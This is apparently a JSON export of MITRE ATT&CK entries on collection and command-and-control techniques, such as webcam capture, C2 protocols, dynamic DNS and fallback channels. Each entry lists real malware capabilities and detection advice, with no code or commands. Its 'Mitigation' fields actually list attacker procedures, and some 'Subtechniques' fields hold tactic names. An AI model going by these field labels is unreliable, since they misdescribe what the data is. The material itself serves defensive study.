    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to take screen captures of the desktop to gather information over the course of an operation."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk, such as CopyFromScreen, xwd, or screencapture.[1][2]. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Video Capture",
    "Code": "T1125",
    "Description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. [1]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can access the victim’s webcam and record video.[2][3]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can record screen content on targeted systems.[4]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has modules that are capable of capturing video from a victim's webcam.[5]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can record screen content in AVI format.[6][7]"
      },
      {
        "id": "S0338",
        "name": "Cobian RAT",
        "description": "Cobian RAT has a feature to access the webcam on the victim’s machine.[8]"
      },
      {
        "id": "S0591",
        "name": "ConnectWise",
        "description": "ConnectWise can record video on remote hosts.[9]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can capture webcam video on targeted systems.[10][11]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can access the victim’s webcam to take pictures.[12][13]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi is capable of capturing video.[14]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can capture webcam data on Windows and macOS systems.[15]"
      },
      {
        "id": "S0152",
        "name": "EvilGrab",
        "description": "EvilGrab has the capability to capture video from a victim machine.[16]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.[17][18]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has a remote webcam monitoring capability.[19][20]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can remotely activate the victim’s webcam to capture content.[21][22]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT has the capability to capture video from a webcam.[23][24]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar captures images from the webcam.[25]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete takes photos from the computer’s web camera.[26][27][28]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore can access the victim's webcam and capture data.[29][30]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can access the victim's webcam.[31][32]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can capture images from webcams on compromised hosts.[33]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can capture camera video as part of its collection process.[34]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.[35]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can access a connected webcam and capture pictures.[36]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can perform webcam viewing.[37][38]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos can access a system’s webcam and take pictures.[39]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT has the ability to access the webcam.[40][41]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to record video on a compromised host.[42][43]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has been observed making videos of victims to observe bank employees day to day activities.[44][45]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[46]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to capture webcam video.[47]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can access the webcam on a victim's machine.[48][49]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has a command to perform video device spying.[50]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system. Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Application Layer Protocol",
    "Code": "T1071",
    "Description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",
    "Mitigation": [
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to use Telnet for communication.[1]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[2]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used an IRC channel for C2 communications.[3]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.[4]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware has used IRC for C2.[5][6]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519."
      },
      {
        "id": "S1084",
        "name": "QUIETEXIT",
        "description": "QUIETEXIT can use an inverse negotiated SSH connection as part of its C2.[7]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke issued wget requests from infected systems to the C2.[8]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape connects to an IRC server for C2.[9]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used an IRC bot for C2 communications.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1071.001",
        "name": "Web Protocols"
      },
      {
        "id": "T1071.002",
        "name": "File Transfer Protocols"
      },
      {
        "id": "T1071.003",
        "name": "Mail Protocols"
      },
      {
        "id": "T1071.004",
        "name": "DNS"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Communication Through Removable Media",
    "Code": "T1092",
    "Description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[1]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.[2][3][1]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Access",
        "detects": "Monitor for unexpected file access on removable media"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Drive Creation",
        "detects": "Monitor for newly executed processes when removable media is mounted."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Content Injection",
    "Code": "T1659",
    "Description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note: this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) [2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server [3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
    "Mitigation": [
      {
        "id": "S1088",
        "name": "Disco",
        "description": "Disco has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.[5]"
      },
      {
        "id": "G1019",
        "name": "MoustachedBouncer",
        "description": "MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for unexpected and abnormal file creations that may indicate malicious content injected through online network communications."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for other unusual network traffic that may indicate additional malicious content transferred to the system. Use network intrusion detection systems, sometimes with SSL/TLS inspection, to look for known malicious payloads, content obfuscation, and exploit code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Look for behaviors on the endpoint system that might indicate successful compromise, such as abnormal behaviors of browser processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, or evidence of Discovery."
      }
    ],
    "Subtechniques": "InitialAccess, CommandandControl"
  },
  {
    "Title": "Data Encoding",
    "Code": "T1132",
    "Description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.[1] [2] Some data encoding systems may also result in data compression, such as gzip.",
    "Mitigation": [
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "After encrypting C2 data, BADNEWS converts it into a hexadecimal representation and then encodes it into base64.[3]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 obfuscates C2 traffic with an altered version of base64.[4]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit sends the payload from the C2 server as an encoded URL parameter. [5]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic provides various transform functions to encode and/or randomize C2 data.[6]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used encoded data in HTTP URLs for C2.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols and packet contents."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1132.001",
        "name": "Standard Encoding"
      },
      {
        "id": "T1132.002",
        "name": "Non-Standard Encoding"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Data Obfuscation",
    "Code": "T1001",
    "Description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
    "Mitigation": [
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy may obfuscate portions of the initial C2 handshake.[1]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can send compressed and obfuscated packets to C2.[2]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4.[3]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.[4]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist can embed C2 responses in the source code of a fake Flickr webpage.[5]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has hashed a string containing system information prior to exfiltration via POST requests.[6]"
      },
      {
        "id": "S0682",
        "name": "TrailBlazer",
        "description": "TrailBlazer can masquerade its C2 traffic as legitimate Google Notifications HTTP requests.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1001.001",
        "name": "Junk Data"
      },
      {
        "id": "T1001.002",
        "name": "Steganography"
      },
      {
        "id": "T1001.003",
        "name": "Protocol Impersonation"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Dynamic Resolution",
    "Code": "T1568",
    "Description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.[1][2][3]",
    "Mitigation": [
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used Dynamic DNS providers for their malware C2 infrastructure.[4]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can be configured to use dynamic DNS.[5]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has used a dynamic DNS service for C2.[6]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has used DDNS for C2 communications.[7]"
      },
      {
        "id": "C0026",
        "name": "C0026",
        "description": "During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.[8]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has incorporated dynamic DNS domains in its infrastructure.[9]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use dynamic DNS domain names in C2.[10]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has forged POST strings with a random choice from a list of possibilities including \"forum\", \"php\", \"view\", etc. while making connection with the C2, hindering detection efforts.[11]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "NETEAGLE can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.[12]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used dynamic DNS services for C2.[13]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "For Operation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.[14]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "For Operation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.[15]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.[16][17]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[18]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.[19]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has used dynamic DNS services for C2 infrastructure.[20]"
      },
      {
        "id": "S0671",
        "name": "Tomiris",
        "description": "Tomiris has connected to a signalization server that provides a URL and port, and then Tomiris sends a GET request to that URL to establish C2.[21]"
      },
      {
        "id": "G0134",
        "name": "Transparent Tribe",
        "description": "Transparent Tribe has used dynamic DNS services to set up C2.[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1568.001",
        "name": "Fast Flux DNS"
      },
      {
        "id": "T1568.002",
        "name": "Domain Generation Algorithms"
      },
      {
        "id": "T1568.003",
        "name": "DNS Calculation"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Encrypted Channel",
    "Code": "T1573",
    "Description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
    "Mitigation": [
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used multiple layers of encryption within malware to protect C2 communication.[1]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has encrypted their C2 communications.[2]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has used encryption for its C2 channel.[3]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic can engage in encrypted communications with C2.[4]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has encrypted TCP communications to evade detection.[5]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can support encrypted communications between the client and server.[6][7]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has used TLS encryption to initialize a custom protocol for C2 communications.[8]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used an encrypted http proxy in C2 communications.[9]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can encrypt C2 communications.[10]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess can use an encrypted channel for C2 communications.[11]"
      },
      {
        "id": "S1046",
        "name": "PowGoop",
        "description": "PowGoop can receive encrypted commands from C2.[12]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can use an encrypted beacon to check in with C2.[13]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has encrypted traffic with the C2 to prevent network detection.[14]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1573.001",
        "name": "Symmetric Cryptography"
      },
      {
        "id": "T1573.002",
        "name": "Asymmetric Cryptography"
      }
    ],
    "Tactic": "\nCommand and Control"
  },
  {
    "Title": "Fallback Channels",
    "Code": "T1008",
    "Description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "Mitigation": [
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can use a second channel for C2 when the primary channel is in upload mode.[2]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used the Steam community page as a fallback mechanism for C2.[3]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar has the ability to use an alternative C2 server if the primary server fails.[4]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server.[5][6]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has the capability to communicate over a backup channel via plus.google.com.[7]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can use backup C2 servers if the primary server fails.[8]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can communicate over multiple C2 host and port combinations.[9]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can change its C2 channel once every 360 loops by retrieving a new domain from the actors’ S3 bucket.[10]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK can switch to a new C2 channel if the current one is broken.[11]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch has used a hardcoded GitHub repository as a fallback channel.[12]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi uses a backup communication method with an HTTP beacon.[13]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.[14]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.[15]"
      },
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux can attempt to find a new C2 server if it receives an error.[16]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke has used several C2 servers per targeted organization.[17]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.[18]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use multiple domains and protocols in C2.[19]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has multiple C2 channels in place in case one fails.[20]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole has been configured with several servers available for alternate C2 communications.[21][22]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.[23]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar can accept multiple URLs for C2 servers.[24]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can assign hard-coded fallback domains for C2.[25]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established.[26]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[27][28]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can change C2 servers.[29]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete has sent data over HTTP if FTP failed, and has also used a fallback server.[30]"
      },
      {
        "id": "S0051",
        "name": "MiniDuke",
        "description": "MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.[31]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.[32]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.[33]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.[34]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used company extranet servers as secondary C2 servers.[35]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.[36]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can switch to an alternate C2 domain when a particular date has been reached.[37]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.[38]"
      },
      {
        "id": "S1084",
        "name": "QUIETEXIT",
        "description": "QUIETEXIT can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.[39]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay has the ability to switch between TCP and HTTP for C2 if one method is not working.[40]"
      },
      {
        "id": "S0495",
        "name": "RDAT",
        "description": "RDAT has used HTTP if DNS C2 communications were not functioning.[41]"
      },
      {
        "id": "S0085",
        "name": "S-Type",
        "description": "S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.[32]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can update its configuration to use a different C2 server.[42]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has used a secondary C2 location if the first was unavailable.[43]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has primarily used port 443 for C2 but can use port 80 as a fallback.[44]"
      },
      {
        "id": "S0058",
        "name": "SslMM",
        "description": "SslMM has a hard-coded primary and backup C2 string.[45]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet has the ability to generate new C2 domains.[46]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.[47]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla can go through a list of C2 server IPs and will try to register with each until one responds.[48]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
